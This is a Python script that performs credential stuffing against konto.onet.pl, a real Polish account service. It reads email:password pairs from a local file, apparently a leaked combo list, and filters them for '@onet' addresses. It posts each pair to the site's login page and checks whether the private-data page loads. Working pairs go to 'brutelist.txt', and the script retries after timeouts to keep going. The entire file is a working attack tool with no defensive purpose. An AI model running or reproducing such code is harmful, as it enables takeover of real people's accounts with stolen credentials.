import requests
import time

def main():


	def login_and_password_check(login, password):
		error_count = 0
		while error_count < 3:
			try:
				s = requests.Session()
				url = 'https://konto.onet.pl/'
				r = s.post(f'{url}login.html', data = {'login': login, 'password':password})
				r = s.get(f'{url}data.html')
				if r.text[:47] == '<!DOCTYPE html><html><head><title>Dane prywatne':
					return 1
				else:
					return 0
			except:
				if error_count == 0:
					print('>> TimeOut error! Waiting 1 minute.')
					print('='*30)
					for sec in range(30):
						time.sleep(2)
						print('#', end='')
					print('\n')

				elif error_count == 1:
					print('>> TimeOut error! Waiting 2 minutes.')
					print('='*30)
					for sec in range(30):
						time.sleep(4)
						print('#', end='')
					print('\n')

				elif error_count == 2:
					print('>> TimeOut error! Waiting 5 minutes.')
					print('='*30)
					for sec in range(30):
						time.sleep(10)
						print('#', end='')
					print('\n')

				else:
					print('Failed to check pair {login} :: {password}')
					return 0
					
				error_count += 1


	with  open('db.txt') as data_base:
		lines = data_base.read().split('\n')

	array = list()

	for line in lines:
		if '@onet' in line:
			array.append(line)

	print('Total pairs to check: ' + str(len(array)))
	success_counter = 0

	with open('brutelist.txt', 'w') as brutelist:
		for counter, pair in enumerate(array, 1):
			login = pair[:(pair.find(':'))]
			password = pair[pair.find(':')+1:]
			print(f'[ {str(counter)} from {str(len(array))} ] Login = {login}, password = {password}, trying...')
			if login_and_password_check(login, password) == 1:
				file_data = f'{login}  ||  {password}\n'
				brutelist.write(file_data)
				success_counter += 1
				print('='*60)
				print(f'SUCCESSFULLY LOGGED WITH LOGIN = {login}, PASSWORD: = {password}')
				print('='*60)
			else:
				print('Login failed')

	print('Brute check finished!')
	print(f'Verified {success_counter} pairs from {str(len(array))} prepared')
	check_to_see = input('Do you want to view the list? (y/n): ')
	if check_to_see[:1] == 'y':
		with open('brutelist.txt'):
			print(brutelist)

	empty_input = input('Finished, press Enter to exit...')


if __name__ == '__main__':
	main()
